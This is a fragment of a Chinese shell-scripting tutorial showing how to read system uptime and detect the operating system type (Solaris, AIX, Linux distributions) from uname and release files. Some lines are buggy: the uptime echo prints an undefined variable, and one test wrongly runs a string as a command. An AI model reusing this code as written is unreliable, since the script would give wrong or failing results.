<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tecuptime=$(uptime | awk &apos;&#123;print $3,$4&#125;&apos; | cut -f1 -d&apos;,&apos;)</span><br><span class="line">echo -e &quot;\E[32m System Uptime Days: \E[0m &quot;$&#123;loadverage&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>说明</strong> <br><br>cut -f1 -d’,’:   -f1选定第一列， -d&#39;* &#39; 表示用*分割</p>
</blockquote>
<p>来源：<a href="https://superuser.com/questions/247127/what-is-and-in-linux" target="_blank" rel="noopener">https://superuser.com/questions/247127/what-is-and-in-linux</a></p>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="附录1：-不同操作系统查看操作系统类型"><a href="#附录1：-不同操作系统查看操作系统类型" class="headerlink" title="附录1： 不同操作系统查看操作系统类型"></a>附录1： 不同操作系统查看操作系统类型</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if [ &quot;$&#123;OS&#125;&quot; = &quot;SunOS&quot; ] ; then</span><br><span class="line">    OS=Solaris</span><br><span class="line">    ARCH=`uname -p`</span><br><span class="line">    OSSTR=&quot;$&#123;OS&#125; $&#123;REV&#125;($&#123;ARCH&#125; `uname -v`)&quot;</span><br><span class="line"># uname命令用于打印当前系统相关信息（内核版本号、硬件架构、主机名称和操作系统类型等）。</span><br><span class="line">elif [ &quot;$&#123;OS&#125;&quot; = &quot;AIX&quot; ] ; then</span><br><span class="line">    OSSTR=&quot;$&#123;OS&#125; `oslevel` (`oslevel -r`)&quot;</span><br><span class="line">#AIX是IBM开发的一套类UNIX操作系统，关于它更多的指令可以查看http://www.cnblogs.com/sbaicl/articles/2947795.html</span><br><span class="line">elif [ &quot;$&#123;OS&#125;&quot; = &quot;Linux&quot; ] ; then</span><br><span class="line">    KERNEL=`uname -r`</span><br><span class="line">    if [ -f /etc/redhat-release ] ; then</span><br><span class="line">        DIST=&apos;RedHat&apos;</span><br><span class="line">        PSUEDONAME=`cat /etc/redhat-release | sed s/.*\(// | sed s/\)//`</span><br><span class="line">        REV=`cat /etc/redhat-release | sed s/.*release\ // | sed s/\ .*//`</span><br><span class="line">#sed通常用来匹配一个或多个正则表达式的文本进行处理,可以查看http://coolshell.cn/articles/9104.html</span><br><span class="line">    elif [ -f /etc/SuSE-release ] ; then</span><br><span class="line">        DIST=`cat /etc/SuSE-release | tr &quot;\n&quot; &apos; &apos;| sed s/VERSION.*//`</span><br><span class="line">        REV=`cat /etc/SuSE-release | tr &quot;\n&quot; &apos; &apos; | sed s/.*=\ //`</span><br><span class="line">    elif [ -f /etc/mandrake-release ] ; then</span><br><span class="line">        DIST=&apos;Mandrake&apos;</span><br><span class="line">        PSUEDONAME=`cat /etc/mandrake-release | sed s/.*\(// | sed s/\)//`</span><br><span class="line">        REV=`cat /etc/mandrake-release | sed s/.*release\ // | sed s/\ .*//`</span><br><span class="line">    elif [ -f /etc/debian_version ] ; then</span><br><span class="line">        DIST=&quot;Debian `cat /etc/debian_version`&quot;</span><br><span class="line">        REV=&quot;&quot;</span><br><span class="line"></span><br><span class="line">    fi</span><br><span class="line">    if $&#123;OSSTR&#125; [ -f /etc/UnitedLinux-release ] ; then</span><br><span class="line">        DIST=&quot;$&#123;DIST&#125;[`cat /etc/UnitedLinux-release | tr &quot;\n&quot; &apos; &apos; | sed s/VERSION.*//`]&quot;</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">    OSSTR=&quot;$&#123;OS&#125; $&#123;DIST&#125; $&#123;REV&#125;($&#123;PSUEDONAME&#125; $&#123;KERNEL&#125; $&#123;MACH&#125;)&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>shellScript</tag>
      </tags>
  </entry>
</search>
